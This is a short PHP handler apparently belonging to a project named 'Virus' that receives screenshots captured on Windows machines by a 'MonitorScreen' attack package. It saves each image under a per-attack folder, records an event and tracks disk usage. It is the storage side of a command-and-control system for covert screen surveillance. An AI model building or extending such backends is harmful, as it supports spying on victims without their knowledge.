<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $this */

$unixTime = time();
$filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen-$unixTime.png";
$this->requestData->moveFile("screen", $filePath);
$this->saveEventFromIntercept($unixTime);
$this->resetStaticUsage();
$this->usage()->addDisk(filesize($filePath))->saveState();
$this->reportStaticUsage();
$this->purgeEvents();
